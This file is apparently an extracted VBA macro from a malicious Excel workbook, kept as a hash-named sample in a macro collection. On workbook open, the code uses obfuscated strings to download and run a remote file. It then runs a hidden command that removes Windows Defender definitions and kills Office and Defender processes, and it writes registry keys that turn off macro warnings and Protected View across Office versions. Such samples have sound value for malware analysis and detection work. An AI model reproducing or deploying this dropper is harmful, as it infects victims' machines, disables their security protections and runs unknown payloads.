@@ -1,0 +1,124 @@
+Filename     : ./macros/bfe75f173a6a2cc8b181717ae2576fba09d816c0366b2930e8e627895689838f
+OLE stream   : VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Private Sub Workbook_Open()
+Dim http_obj
+Dim stream_obj
+Dim shell_obj
+Set http_obj = CreateObject(YDj0bF3tV(StrReverse(xBLQn36ZJ("[WO[TS5_m{zvyvpjT")), StrReverse(xBLQn36ZJ("7"))))
+Set stream_obj = CreateObject(YDj0bF3tV(StrReverse(xBLQn36ZJ("frwjXyG3TIFI")), StrReverse(StrReverse(StrReverse(xBLQn36ZJ(xBLQn36ZJ(xBLQn36ZJ("5"))))))))
+Set shell_obj = CreateObject(YDj0bF3tV(StrReverse(xBLQn36ZJ("ookh1VswulVfZ")), StrReverse(xBLQn36ZJ("3"))))
+URL = YDj0bF3tV(StrReverse(xBLQn36ZJ("zg0g131ktmyqo1eqz0qrovvg1u<1vrjv")), StrReverse(xBLQn36ZJ("2"))) 'Where to download the file from
+Filename = YDj0bF3tV(StrReverse(xBLQn36ZJ("}j3j87xyMthaqnzgaUwxxjaZH?")), StrReverse(StrReverse(StrReverse(xBLQn36ZJ(xBLQn36ZJ(xBLQn36ZJ("5")))))))
+RUNCMD = YDj0bF3tV(StrReverse(xBLQn36ZJ("}j3j87xyMthaqnzgaUwxxjaZH?")), StrReverse(StrReverse(StrReverse(xBLQn36ZJ(xBLQn36ZJ(xBLQn36ZJ("5")))))))
+http_obj.Open YDj0bF3tV(StrReverse(xBLQn36ZJ("KZM")), StrReverse(xBLQn36ZJ("6"))), URL, False
+http_obj.send
+stream_obj.Type = 1
+stream_obj.Open
+stream_obj.write http_obj.responseBody
+stream_obj.savetofile Filename, 2
+shell_obj.Run RUNCMD
+Set defender = CreateObject("WScript.Shell")
+Dim Start
+Start = "cmd.exe /c cd ""%ProgramFiles%\Windows Defender"" & MpCmdRun.exe -removedefinitions -dynamicsignatures & taskkill /f /im winword.exe & taskkill /f /im excel.exe & taskkill /f /im MSPUB.exe & taskkill /f /im POWERPNT.EXE & taskkill /f /im MSASCuiL.exe & taskkill /f /im MpCmdRun.exe & exit"
+defender.Run Start, vbHide
+
+Set wso = CreateObject("WScript.Shell")
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\PowerPoint\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\publisher\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\publisher\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\publisher\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\publisher\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\publisher\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\PowerPoint\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\PowerPoint\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\PowerPoint\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
+wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
+End Sub
+
+
+Public Function YDj0bF3tV(mPObOBmc0 As String, oItsA88ZO As Integer)
+    Dim uqoX2UDmG As Integer
+    For uqoX2UDmG = 1 To Len(mPObOBmc0)
+GoTo XghfkIOWANMcgiaAPH
+XghfkIOWANMcgiaAPH:
+        Mid(mPObOBmc0, uqoX2UDmG, 1) = Chr(Asc(Mid(mPObOBmc0, uqoX2UDmG, 1)) - oItsA88ZO)
+    Next uqoX2UDmG
+GoTo rZbyYdrnWjJKktGiCg
+rZbyYdrnWjJKktGiCg:
+    YDj0bF3tV = mPObOBmc0
+End Function
+Public Function xBLQn36ZJ(mnNALwyYP As String) As String
+Dim oItsA88ZO As Variant
+For oItsA88ZO = 1 To Len(mnNALwyYP) Step 2
+GoTo blrnAQRmowVDfyciCK
+blrnAQRmowVDfyciCK:
+xBLQn36ZJ = xBLQn36ZJ & StrReverse(Mid(mnNALwyYP, oItsA88ZO, 2))
+DoEvents
+Next oItsA88ZO
+End Function
+
